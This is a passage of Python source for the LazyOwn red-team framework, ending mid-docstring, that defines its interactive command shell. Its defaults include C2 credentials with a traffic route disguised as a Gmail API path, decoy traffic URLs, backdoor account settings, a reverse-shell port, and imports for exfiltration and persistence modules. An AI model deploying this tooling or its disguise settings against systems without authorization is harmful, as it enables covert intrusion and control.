#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
lazyown

Author: Gris Iscomeback
Email: grisiscomeback at gmail dot com
Creation Date: 13/08/2024
License: GPL v3

Description: This file contains the definition of the logic in the LazyOwnShell class

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

from typing import Any

import cmd2
import logging
from cmd2 import with_argparser, with_argument_list, with_category
from cmd2.plugin import PostcommandData as _PostcommandData

from cli.aliases import empty_placeholders as _empty_alias_placeholders
from cli.aliases import REQUIRED_PLACEHOLDERS as _REQUIRED_ALIAS_PLACEHOLDERS
from cli.aliases import load_aliases as _load_aliases
from cli.assign import apply_assign as _apply_assign
from cli.autosuggest import SKIP_TRIGGER_COMMANDS as _AUTOSUGGEST_SKIP
from cli.autosuggest import SuggestionContext as _SuggestionContext
from cli.autosuggest import build_default_engine as _build_autosuggest_engine
from cli.autosuggest import render_hint_line as _render_autosuggest_hint
from cli.banner_config import banner_summary as _banner_summary
from cli.banner_config import configure_banner_interactive as _configure_banner_interactive
from cli.engagement_hooks import heal_commands_seen as _heal_engagement_history
from cli.engagement_hooks import render_engagement_hook as _render_engagement_hook
from cli.engagement_hooks import reset_session as _reset_engagement_session
from cli.fuzzy_picker import install_fuzzy_completion as _install_fuzzy_completion
from cli.graph_advisor import GraphAdvisor as _GraphAdvisor
from cli.graph_advisor import format_god_nodes as _format_god_nodes
from cli.graph_advisor import format_neighbors as _format_neighbors
from cli.graph_advisor import format_search_table as _format_search_table
from cli.ops_commands import PHASES as _PHASES
from cli.ops_commands import loot_graph as _loot_graph
from cli.ops_commands import loot_mark as _loot_mark
from cli.ops_commands import loot_reuse as _loot_reuse
from cli.ops_commands import loot_search as _loot_search
from cli.ops_commands import loot_show as _loot_show
from cli.ops_commands import note_add as _note_add
from cli.ops_commands import note_list as _note_list
from cli.ops_commands import pivot_add as _pivot_add
from cli.ops_commands import pivot_list as _pivot_list
from cli.ops_commands import print_ctx as _print_ctx
from cli.ops_commands import print_phase as _print_phase
from cli.ops_commands import read_phase as _read_phase
from cli.ops_commands import scans_list as _scans_list
from cli.ops_commands import sitrep as _sitrep
from cli.ops_commands import tasks_add as _tasks_add
from cli.ops_commands import tasks_done as _tasks_done
from cli.ops_commands import tasks_list as _tasks_list
from cli.ops_commands import tasks_start as _tasks_start
from cli.ops_commands import tgrep as _tgrep
from cli.ops_commands import write_phase as _write_phase
from cli.palette import CommandIndexError as _CommandIndexError
from cli.palette import load_index as _load_command_index
from cli.palette_command import PaletteCompleter as _PaletteCompleter
from cli.palette_command import PaletteRenderConfig as _PaletteRenderConfig
from cli.palette_command import render as _render_palette
from cli.protips import print_session_tip as _print_session_tip
from cli.protips import render_contextual_tip as _render_contextual_tip
from cli.reactive_hints import _KILL_CHAIN_NEXT as _AUTOSUGGEST_CHAIN
from cli.reactive_hints import _PHASE_PRIORITY as _AUTOSUGGEST_PHASE_PRIORITY
from cli.reactive_hints import render_command_hints as _render_command_hints
from cli.registry import register_command_sets as _register_command_sets
from cli.scope_guard import ScopeGuard as _ScopeGuard
from cli.scope_guard import ScopeMode as _ScopeMode
from cli.scope_guard import build_offensive_commands as _build_offensive_commands
from cli.show import format_payload as _format_payload
from cli.status_bar import build_default_manager as _build_status_bar_manager
from cli.toast_bus import render_toasts as _render_toasts
from cli.wizard import run as _run_wizard
from core.config import load_and_validate as _load_and_validate
from core.config import load_payload as _load_payload
from core.config import save_payload as _save_payload
from cli.auto_crypto import AutoCryptoEngine as _AutoCryptoEngine
from cli.auto_crypto import AutoCryptoConfig as _AutoCryptoConfig
from cli.auto_crypto import build_password_provider_from_cli_login as _build_crypto_password_provider
from cli.tips_engine import TipsEngine as _TipsEngine
from cli.tips_engine import TipsConfig as _TipsConfig
from cli.tips_engine import build_default_tips_config as _build_default_tips_config
from modules.db import LazyOwnDB as _LazyOwnDB
from modules.event_bus import EventCategory as _EventCategory
from modules.event_bus import EventSeverity as _EventSeverity
from modules.event_bus import LazyEvent as _LazyEvent
from modules.event_bus import get_event_bus as _get_event_bus
from modules.llm_factory import try_get_llm_backend as _try_get_llm_backend
from modules.logging_config import configure as _configure_logging
from modules.metrics import get_recorder as _get_metrics_recorder
from modules.module_registry import ModuleRegistry as _ModuleRegistry
from modules.module_registry import format_module_detail as _format_module_detail
from modules.module_registry import format_module_table as _format_module_table
from modules.payload_factory import PayloadFactory as _PayloadFactory
from modules.payload_factory import format_payload_table as _format_payload_table
from skills.unified_orchestrator import build_default_orchestrator as _build_unified_orchestrator
from utils import (  # noqa: E402
    BANNER,
    BG_BLACK,
    BG_RED,
    BLUE,
    BOLD,
    BRIGHT_BLUE,
    BRIGHT_RED,
    BRIGHT_YELLOW,
    CYAN,
    GREEN,
    HEADLESS,
    IP2ASN,
    MAGENTA,
    NOBANNER,
    NOLOGS,
    RED,
    REQUIRED_KEYS,
    RESET,
    RPC_C_AUTHN_LEVEL_NONE,
    UNDERLINE,
    USER_ALIASES_FILE,
    WHITE,
    YELLOW,
    AESencrypt,
    Config,
    ConnectionError,
    Console,
    Filter,
    IObjectExporter,
    LuaRuntime,
    MemoryStore,
    MyServer,
    NmapParser,
    NmapProcess,
    Panel,
    Path,
    ProcessResults,
    PyKeePass,
    RequestException,
    SimpleHTTPRequestHandler,
    Spray,
    Text,
    Timer,
    activate_server,
    activate_virtualenv,
    argparse,
    base64,
    check_lhost,
    check_lport,
    check_rhost,
    check_sudo,
    clean_html,
    clean_output,
    clean_url,
    command_and_control_category,
    copy2clip,
    crack_password,
    create_arp_packet,
    create_caldera_config,
    create_msfshellcoder_parser,
    create_synthetic_yaml,
    credential_access_category,
    csv,
    curses,
    date,
    datetime,
    decode,
    detect_delimiter,
    display_news,
    donut,
    dropFile,
    encode,
    ensure_tmux_session,
    exfiltration_category,
    exploitation_category,
    extract,
    format_openssh_key,
    format_rsa_key,
    generate_certificates,
    generate_emails,
    generate_http_req,
    generate_index,
    generate_random_cve_id,
    generate_xor_key,
    get_banner,
    get_credentials,
    get_domain,
    get_hash,
    get_open_ports,
    get_org,
    get_users_dic,
    getprompt,
    glob,
    handle,
    inject_payloads,
    io,
    is_binary_present,
    is_exist,
    itertools,
    json,
    lateral_movement_category,
    list_binaries,
    load_adversary,
    load_payload,
    load_user_aliases,
    manual_yaml_extraction,
    miscellaneous_category,
    os,
    parse_ip_mac,
    parse_nmap_csv,
    parse_yaml_response,
    persistence_category,
    post_exploitation_category,
    preprocess_llm_response,
    print_error,
    print_msg,
    print_succ,
    print_warn,
    privilege_escalation_category,
    product,
    prompt,
    pwntomate_category,
    query_arin_ip,
    quote,
    random_string,
    re,
    recon_category,
    replace_command_placeholders,
    replace_placeholders,
    replace_variables,
    reporting_category,
    requests,
    rotate_char,
    run,
    run_command,
    salida_strace,
    save_playbook,
    scanning_category,
    scrape_news,
    select_binary,
    send_packet,
    session_name,
    shellcode_to_sylk,
    shlex,
    shutil,
    socket,
    startup_ns,
    string,
    struct,
    subprocess,
    sys,
    teclado_usuario,
    tempfile,
    threading,
    time,
    timedelta,
    timezone,
    transform,
    transport,
    unquote,
    urandom,
    url_download,
    version,
    yaml,
)

_PALETTE_RENDER_CONFIG = _PaletteRenderConfig()
_PALETTE_COMPLETER = _PaletteCompleter(_PALETTE_RENDER_CONFIG)

config = _load_payload()

try:
    _result = _load_and_validate()
    _validated = _result["payload"]
    _issues = _result["issues"]
    _errs = [i for i in _issues if getattr(i, "severity", None) and str(i.severity) == "error"]
    _warns = [i for i in _issues if getattr(i, "severity", None) and str(i.severity) == "warning"]
    if _errs:
        import sys as _sys
        for _e in _errs:
            _sys.stderr.write(f"[payload] ERROR: {_e.key}: {_e.message}\n")
    if _warns:
        import sys as _sys
        for _w in _warns:
            _sys.stderr.write(f"[payload] WARNING: {_w.key}: {_w.message}\n")
except Exception:
    pass
aes_key = config.get("aes_key")
api_key = config.get("api_key")
route_malleable = config.get("c2_malleable_route")
win_useragent_malleable = config.get("user_agent_win")
lin_useragent_malleable = config.get("user_agent_lin")
rhost = config.get("rhost")
lhost = config.get("lhost")
c2_user = config.get("c2_user")
c2_pass = config.get("c2_pass")
c2_port = config.get("c2_port")
start_user = config.get("start_user")
start_pass = config.get("start_pass")
domain = config.get("domain")
dnswordlist = config.get("dnswordlist")
user_agent_1 = config.get("user_agent_1")
user_agent_2 = config.get("user_agent_2")
user_agent_3 = config.get("user_agent_3")
url_traffic_1 = config.get("url_traffic_1")
url_traffic_2 = config.get("url_traffic_2")
url_traffic_3 = config.get("url_traffic_3")


_BOOL_TRUE_TOKENS: frozenset[str] = frozenset({"true", "1", "yes", "on"})
_BOOL_FALSE_TOKENS: frozenset[str] = frozenset({"false", "0", "no", "off"})


def _parse_bool_setting(value: Any) -> bool:
    """Coerce a cmd2 ``set`` argument into a Python ``bool``.

    Accepts native booleans, integers, and the canonical truthy/falsy
    strings used elsewhere in the framework (``true``/``false``,
    ``yes``/``no``, ``on``/``off``, ``1``/``0``). Anything else raises
    :class:`ValueError` so cmd2 surfaces the error to the operator
    instead of silently coercing to ``False``.
    """
    if isinstance(value, bool):
        return value
    if isinstance(value, int):
        return bool(value)
    if isinstance(value, str):
        lowered = value.strip().lower()
        if lowered in _BOOL_TRUE_TOKENS:
            return True
        if lowered in _BOOL_FALSE_TOKENS:
            return False
    raise ValueError(
        f"cannot parse {value!r} as boolean; expected one of true/false/yes/no/on/off/1/0"
    )


class _PayloadSettableProxy:
    """Attribute view over a payload mapping for cmd2 ``Settable`` targets.

    cmd2's ``Settable`` reads and writes its bound attribute on a
    *target object* (``getattr`` / ``setattr``). LazyOwn keeps its
    runtime configuration in a plain ``dict`` (``self.params``) so this
    proxy bridges the two: every attribute read or write is delegated to
    the underlying dict, which keeps ``set <key> <value>`` and
    ``assign <key> <value>`` operating on the same backing store with no
    drift between them.
    """

    def __init__(self, params: dict) -> None:
        """Bind the proxy to a live ``params`` dictionary."""
        object.__setattr__(self, "_params", params)

    def __getattr__(self, name: str) -> Any:
        params = object.__getattribute__(self, "_params")
        if name in params:
            return params[name]
        raise AttributeError(name)

    def __setattr__(self, name: str, value: Any) -> None:
        params = object.__getattribute__(self, "_params")
        params[name] = value


_UI_HINTS_LEVELS = ("on", "minimal", "off")


class LazyOwnShell(cmd2.Cmd):
    """
    A custom interactive shell for the LazyOwn Framework.
    This class extends the Cmd class to provide an interactive command-line
    interface for the LazyOwn Framework. It supports various commands and
    modules related to security and network operations. The shell is initialized
    with a set of parameters and scripts, allowing users to execute predefined
    functions and manage tasks within the framework.

    Attributes:
        prompt (str): The command prompt for the shell, obtained from the
                      `getprompt()` function.
        intro (str): A welcome message and disclaimer displayed when the shell
                     starts, with information about the framework and its usage.
        aliases (dict): A dictionary of command aliases for easier access to
                        frequently used commands.
        params (dict): A dictionary of parameters with their default values,
                       used for configuring various aspects of the framework.
        scripts (list): A list of script names included in the toolkit, representing
                        the available modules and functionalities.
        output (str): An empty string for storing output or results from executed
                      commands or scripts.
        custom_prompt (str): A custom prompt for the shell, obtained from the
                             `getprompt()` function.

    Methods:
        __init__(): Initializes the shell with default parameters, script names,
                    and an empty output string. Sets up the command prompt and
                    custom prompt.
    """

    prompt = getprompt()

    if NOBANNER:
        intro = ""
    else:
        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BRIGHT_BLUE}{version}
    {WHITE}[*] interactive s{BRIGHT_RED}H{WHITE}ell! Type ? to list commands{BLUE}
    {RED}[!] Please do not use in military or secret service organizations,
    {RED}[!] or for illegal purposes (this is non-binding,
    {RED}[!] these *** ignore laws and ethics anyway){BLUE}
    {GREEN}[+] Github: {BRIGHT_BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
    {GREEN}[+] Discord: {BRIGHT_BLUE}{UNDERLINE}https://discord.gg/V3usU8yH{RESET}
    {GREEN}[+] Web: {BRIGHT_BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
    {GREEN}[+] Reddit: {BRIGHT_BLUE}{UNDERLINE}https://www.reddit.com/r/LazyOwn/{RESET}
    {GREEN}[+] Facebook: {BRIGHT_BLUE}{UNDERLINE}https://web.facebook.com/profile.php?id=61560596232150{RESET}
    {GREEN}[+] HackTheBox: {BRIGHT_BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
    {GREEN}[+] Grisun0: {BRIGHT_BLUE}{UNDERLINE}https://app.hackthebox.com/users/1998024{RESET}
    {GREEN}[+] Patreon: {BRIGHT_BLUE}{UNDERLINE}https://patreon.com/LazyOwn {RESET}
    {GREEN}[↙] Download: {BRIGHT_BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz {RESET}
        """
    activate_virtualenv("env")

    config = Config(load_payload())

    _rhost_for_hint = config.rhost
    if not NOBANNER and not _rhost_for_hint:
        intro += (
            f"\n    {YELLOW}[!] rhost is not set — run {GREEN}wizard{YELLOW} for guided setup"
            f" or {GREEN}assign rhost <IP>{YELLOW} to start.{RESET}\n"
        )

    rhost = config.rhost
    lhost = config.lhost
    lport = config.lport
    c2_port = config.c2_port
    device = config.device
    api_key = config.api_key
    domain = config.domain
    scope = config.scope if config.scope is not None else []
    scope_enforcement = config.scope_enforcement or "warn"

    aliases: dict = {}
    """Populated at runtime in __init__ from cli/aliases.yaml."""

    def __init__(self):
        """
        Initializer for the LazyOwnShell class.

        This method sets up the initial parameters and scripts for an instance of
        the LazyOwnShell class. It initializes a dictionary of parameters with default
        values and a list of script names that are part of the LazyOwnShell toolkit.

        Attributes:
            params (dict): A dictionary of parameters with their default values.
            scripts (list): A list of script names included in the toolkit.
            output (str): An empty string to store output or results.
        """
        use_ai = False
        #super().__init__(self)
        super().__init__(
            multiline_commands=['echo'],
            persistent_history_file='LazyOwn_history.dat',
            startup_script='lazyscripts/startup.ls',
            include_ipy=True,
        )
        try:
            self.aliases.update(_load_aliases(load_payload(), lazy=True))
        except Exception as exc:
            print_warn(f"failed to load cli/aliases.yaml: {exc}")
        try:
            _register_command_sets(self)
        except Exception as exc:
            print_warn(f"failed to register CommandSets: {exc}")
        self.ip2asn = IP2ASN()
        #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
        self.plugins_dir = 'plugins'
        self.lazyaddons_dir = 'lazyaddons'
        self.lua = LuaRuntime(unpack_returned_tuples=True)
        self.plugins = {}
        self.register_lua_command = self._register_lua_command
        self.lua.globals().register_command = self.register_lua_command
        self.lua.globals().app = self
        self.lua.globals().list_files_in_directory = self.list_files_in_directory
        self.load_plugins()
        self.register_tool_commands()
        self.completekey = 'tab'
        self.register_all_adversary_commands()
        try:
            _install_fuzzy_completion(self, payload=load_payload())
        except Exception as exc:
            print_warn(f"fuzzy completion not installed: {exc}")
        try:
            self._tips_engine = _TipsEngine(
                config=_build_default_tips_config(),
                autosuggest_engine=None,
            )
        except Exception as exc:
            print_warn(f"tips engine not initialised: {exc}")
            self._tips_engine = None
        try:
            self._auto_crypto = _AutoCryptoEngine(
                config=_AutoCryptoConfig(
                    sessions_dir="sessions",
                    auto_enabled=True,
                    password_provider=_build_crypto_password_provider(),
                )
            )
        except Exception as exc:
            print_warn(f"auto crypto not initialised: {exc}")
            self._auto_crypto = None
        try:
            self._run_auto_decrypt()
        except Exception:
            pass
        import atexit as _atexit
        _atexit.register(self._run_auto_encrypt)
        self.register_postcmd_hook(self._unified_tips_hook)
        self.register_postcmd_hook(self._recording_hook)
        self.register_postcmd_hook(self._toast_hook)
        _reset_engagement_session()
        _heal_engagement_history({f"do_{c}" for c in self.get_all_commands()})
        self._scope_offensive = frozenset()
        try:
            self._scope_offensive = self._build_scope_offensive()
        except Exception as exc:
            print_warn(f"scope guard classification unavailable: {exc}")
        self._autosuggest = None
        self._autosuggest_advisor = None
        try:
            self._autosuggest_advisor = _GraphAdvisor.from_path()
        except Exception as exc:
            print_warn(f"autosuggest graph advisor unavailable: {exc}")
            self._autosuggest_advisor = None
        try:
            initial_autosuggest_enabled = str(
                load_payload().get("enable_autosuggest", True)
            ).lower() not in ("false", "0", "no")
            self._autosuggest = _build_autosuggest_engine(
                advisor=self._autosuggest_advisor,
                chain=_AUTOSUGGEST_CHAIN,
                phase_priority=_AUTOSUGGEST_PHASE_PRIORITY,
                enabled=initial_autosuggest_enabled,
            )
            if self._tips_engine is not None:
                self._tips_engine._autosuggest = self._autosuggest
        except Exception as exc:
            print_warn(f"autosuggest engine not initialised: {exc}")
            self._autosuggest = None
        try:
            self.aliases["."] = "next"
        except Exception:
            pass
        self.output = ""
        self.custom_prompt = getprompt()
        self.c2_url = f"https://{lhost}:{c2_port}"
        self.c2_auth = (c2_user, c2_pass)
        self.c2_clientid = "no_priv"
        self.path = os.getcwd()
        self.url_download = url_download
        self.version = version
        self.sessions_dir = f"{self.path}/sessions"
        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')
        self.console = Console()
        self.use_ai = use_ai
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "os_id":"2",
            "domain": None,
            "subdomain": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "path": "/",
            "reverse_shell_port": 7777,
            "listener": 7878,
            "aes_key": aes_key,
            "c2_port": 4444,
            "c2_user": c2_user,
            "c2_pass": c2_pass,
            "enable_c2_implant_debug": True,
            "start_user": "CHANGE_ME",
            "start_pass": "CHANGE_ME",
            "backdoor_username": "CHANGE_ME",
            "backdoor_password": "CHANGE_ME",
            "backdoor_linux_home": "/home/.lazyown",
            "backdoor_win_home": "C:/Users/lazyown/Documents",
            "backdoor_win_service_path": "C:/Users/lazyown/Documents",
            "rhost": rhost,
            "lhost": lhost,
            "scope": LazyOwnShell.scope,
            "scope_enforcement": LazyOwnShell.scope_enforcement,
            "rport": 1337,
            "lport": 1337,
            "sleep": 6,
            "file": "file.ext",
            "sleep_start": 207,
            "c2_malleable_route": "/gmail/v1/users/",
            "user_agent_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "user_agent_1" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "user_agent_2" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "user_agent_3" : "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "url_traffic_1" : "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
            "url_traffic_2" : "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
            "url_traffic_3" : "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
            "rat_key": "CHANGE_ME",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "enable_cloudflare": True,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
            "enable_toasts": True,
            "toast_max_per_tick": 5,
            "enable_operator_presence": False,
            "tui_theme": "default",
        }
        self._load_extended_params()
        from modules.payload_factory import PayloadFactory as _PF
        self._lazyown_db: Any = None
        self._module_registry: Any = None
        self._payload_factory = _PF()
        self._active_module = None
        self._active_module_options: dict = {}
        self._db_workspace: str = "default"
        self._spool_file: str | None = None
        self._spool_handle = None
        self._resource_recording: str | None = None
        self._resource_recording_lines: list = []
        self._scripts_cache: list | None = None
        user_aliases = load_user_aliases()
        self.aliases.update(user_aliases)
        if self.use_ai:
            from modules.llm_factory import try_get_llm_backend as _try_llm
            self.ai_model = _try_llm(config=self.params)
            if self.ai_model is None:
                self.display_toastr("AI backend unavailable; disabling AI features.", type="error")
                self.use_ai = False
            else:
                self.display_toastr("AI backend started.")
        else:
            self.ai_model = None
        self._status_bar_manager = None
        self._unified_orchestrator = None
        try:
            self._status_bar_manager = _build_status_bar_manager(
                payload=self.params,
                sessions_dir=self.sessions_dir,
                advisor_factory=lambda: self._autosuggest_advisor,
            )
            self._status_bar_manager.install(self)
        except Exception as exc:
            print_warn(f"status bar not installed: {exc}")
            self._status_bar_manager = None
        try:
            from skills.unified_orchestrator import build_default_orchestrator as _build_orch
            self._unified_orchestrator = _build_orch(
                payload=self.params,
                sessions_dir=self.sessions_dir,
            )
        except Exception as exc:
            print_warn(f"unified orchestrator not installed: {exc}")
            self._unified_orchestrator = None
        try:
            self._register_ux_settables()
        except Exception as exc:
            print_warn(f"ux settables not registered: {exc}")
        try:
            from modules.event_consumers import wire_all_consumers as _wire_consumers
            _wire_consumers()
        except Exception as exc:
            print_warn(f"event consumers not wired: {exc}")

    def _register_ux_settables(self) -> None:
        """Expose the new UX flags through cmd2's ``set`` command.

        cmd2's ``set`` reads/writes from a target object. The
        :class:`_PayloadSettableProxy` proxies attribute access to
        ``self.params`` so ``set <key> <value>`` and ``assign <key> <value>``
        update the same backing store and both persist through
        :func:`core.config.save_payload`. The four keys registered here
        (``tui_theme``, ``enable_operator_presence``, ``enable_toasts``,
        ``toast_max_per_tick``) match the schema entries in
        :mod:`core.payload_schema`.
        """
        from cmd2 import Settable

        proxy = _PayloadSettableProxy(self.params)
        self._ux_settables_proxy = proxy

        def _persist(name, _old, _new):
            try:
                _save_payload(self.params)
            except Exception as exc:
                print_warn(f"failed to persist {name}: {exc}")

        self.add_settable(
            Settable(
                "tui_theme",
                str,
                "TUI overlay colour theme",
                proxy,
                onchange_cb=_persist,
                choices=("default", "dim", "bright", "colorblind"),
            )
        )
        self.add_settable(
            Settable(
                "enable_operator_presence",
                _parse_bool_setting,
                "Show collaboration operator count in the status bar",
                proxy,
                onchange_cb=_persist,
            )
        )
        self.add_settable(
            Settable(
                "enable_toasts",
                _parse_bool_setting,
                "Print unseen JSONL events as dim toast lines after each command",
                proxy,
                onchange_cb=_persist,
            )
        )
        self.add_settable(
            Settable(
                "toast_max_per_tick",
                int,
                "Maximum toast lines printed per command (1-50)",
                proxy,
                onchange_cb=_persist,
            )
        )
        self.add_settable(
            Settable(
                "ui_hints",
                str,
                "Ambient coaching level: on, minimal (autosuggest only) or off",
                proxy,
                onchange_cb=_persist,
                choices=_UI_HINTS_LEVELS,
            )
        )

    def _load_extended_params(self) -> None:
        """Load extra parameters from ``params/*.yaml`` into ``self.params``.

        Every YAML file in the ``params/`` directory is loaded as a flat
        key-value dict and merged into ``self.params`` at startup. This
        allows operators to add new configuration keys for lazyaddons,
        aliases, and pipelines without modifying ``payload.json`` or
        Python source.

        Files are loaded in alphabetical order; later files override
        earlier ones. ``payload.json`` keys are *not* overwritten.
        """
        import glob
        from pathlib import Path as _Path

        import yaml as _yaml

        params_dir = _Path(__file__).resolve().parent / "params"
        if not params_dir.is_dir():
            return

        for yaml_path in sorted(glob.glob(str(params_dir / "*.yaml"))):
            try:
                with open(yaml_path, "r", encoding="utf-8") as fh:
                    overrides = _yaml.safe_load(fh)
                if not isinstance(overrides, dict):
                    continue
                for key, value in overrides.items():
                    if key not in self.params:
                        self.params[key] = value
            except Exception as exc:
                print_warn(f"params/{_Path(yaml_path).name}: {exc}")

    def log_command(
        self,
        cmd_name,
        cmd_args,
        start_time=None,
        end_time=None,
        duration_ms=0,
    ):
        """
        Logs the command execution details to a CSV file.

        :param cmd_name: The name of the command.
        :param cmd_args: The arguments of the command.
        :param start_time: Optional ``"%Y-%m-%d %H:%M:%S"`` string captured
            before execution. Defaults to the current time when omitted.
        :param end_time: Optional ``"%Y-%m-%d %H:%M:%S"`` string captured
            after execution. Defaults to ``start_time`` when omitted.
        :param duration_ms: Measured wall-clock duration in milliseconds.
        """
        if start_time is None:
            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if end_time is None:
            end_time = start_time

        log_data = {
            "start": start_time,
            "end": end_time,
            "duration_ms": int(max(0, duration_ms)),
            "source_ip": self.params.get("lhost", ""),
            "source_port": self.params.get("lport", ""),
            "destination_ip": self.params.get("rhost", ""),
            "destination_port": self.params.get("rport", ""),
            "domain": self.params.get("domain", ""),
            "subdomain": self.params.get("subdomain", ""),
            "url": self.params.get("url", ""),
            "pivot_port": f"{self.params.get('lport', '')}:{self.params.get('rport', '')}",
            "command": cmd_name,
            "args": cmd_args
        }
        file_path = "sessions/LazyOwn_session_report.csv"
        file_exists = os.path.isfile(file_path)

        with open(file_path, mode='a', newline='') as file:
            writer = csv.DictWriter(
                file,
                fieldnames=log_data.keys(),
                extrasaction='ignore',
            )

            if not file_exists:
                writer.writeheader()

            writer.writerow(log_data)
        try:
            subprocess.run(
                ["chown", "1000:1000", file_path],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except (OSError, FileNotFoundError):
            pass

    def default(self, line):
        """
        Handles undefined commands, including aliases.

        This method checks if a given command (or its alias) exists within the class
        by attempting to find a corresponding method. If the command or alias is not
        found, it prints an error message.

        :param line: The command or alias to be handled.
        :type line: str
        :return: None
        """
        command = self.aliases.get(line.raw, line.raw)
        parts = command.split(maxsplit=1)
        cmd_name = parts[0].strip()
        cmd_args = parts[1] if len(parts) > 1 else ""
        method_name = f"do_{cmd_name}"

        method = getattr(self, method_name, None)
        self.onecmd("rrhost")

        if callable(method):
            return method(cmd_args)
        suggestions = self._did_you_mean(cmd_name)
        if suggestions:
            print_warn(
                f"unknown command '{cmd_name}'. Did you mean: {', '.join(suggestions)} ?"
            )
        self.display_toastr(f"Not Found {line}", type="warning")

    @property
    def scripts(self) -> list:
        """Auto-discovered list of runnable script names.

        Dynamically scans the shell for ``run_<name>`` methods, excluding
        internal plumbing helpers (``run_script``, ``run_command``). The
        result is cached until the next shell restart.

        Returns:
            List of script name strings available via ``run <name>``.
        """
        if self._scripts_cache is None:
            internal = {"run_script", "run_command"}
            self._scripts_cache = sorted(
                name[4:]
                for name in dir(self)
                if name.startswith("run_") and name not in internal
                and callable(getattr(self, name, None))
            )
        return self._scripts_cache

    def do_set(self, line) -> None:
        """Set a parameter — the unified ``set``/``assign`` surface.

        Registered UX settables (``ui_hints``, ``tui_theme``,
        ``enable_toasts``...) keep native cmd2 semantics. Any other key
        delegates to ``assign`` so documentation and muscle memory that
        predate the split (``set rhost 10.10.10.10``) work again. With a
        single unknown key and no value, prints the current value.
        """
        tokens = shlex.split(line) if line else []
        if tokens and not tokens[0].startswith("-") and tokens[0] not in self.settables:
            if len(tokens) == 1:
                key = tokens[0]
                if key in self.params:
                    print_msg(f"{key} = {self.params[key]}")
                else:
                    print_warn(
                        f"Parameter '{key}' not supported (type 'set' for list of parameters). "
                        f"Did you mean: assign {key} <value>?"
                    )
                return
            self.onecmd(f"assign {line}")
            return
        super().do_set(line)

    def _ui_hints_level(self) -> str:
        """Return the ambient coaching level: ``on``, ``minimal`` or ``off``.

        ``off`` suppresses every post-command coaching surface (toasts,
        inline hints, protips, autosuggest and engagement flavour);
        ``minimal`` keeps only the autosuggest accelerator. Any unset or
        unknown value means full ``on``.
        """
        level = str(self.params.get("ui_hints", "on") or "on").strip().lower()
        return level if level in _UI_HINTS_LEVELS else "on"

    def _toast_hook(self, data: _PostcommandData) -> _PostcommandData:
        """Post-command hook that prints unseen JSONL events as toast lines.

        Reads the ``enable_toasts`` flag from ``self.params`` (default
        True) so operators can disable transient notifications with
        ``set enable_toasts false`` without restarting. Any failure is
        swallowed — toasts must never block the shell.

        Args:
            data: cmd2 PostcommandData containing the executed statement.

        Returns:
            ``data`` unchanged.
        """
        if self._ui_hints_level() != "on":
            return data
        try:
            sessions_dir = getattr(self, "sessions_dir", "sessions") or "sessions"
            _render_toasts(payload=self.params, sessions_dir=sessions_dir)
        except Exception:
            pass
        return data


    def _unified_tips_hook(self, data: _PostcommandData) -> _PostcommandData:
        """Unified post-command hook: hints + protips + curiosity + autosuggest + ELO + VRI.

        Replaces the five fragmented hooks (inline hints, engagement,
        autosuggest, toasts, recording) with a single coordination point
        via :class:`cli.tips_engine.TipsEngine`.

        Args:
            data: cmd2 PostcommandData containing the executed statement.

        Returns:
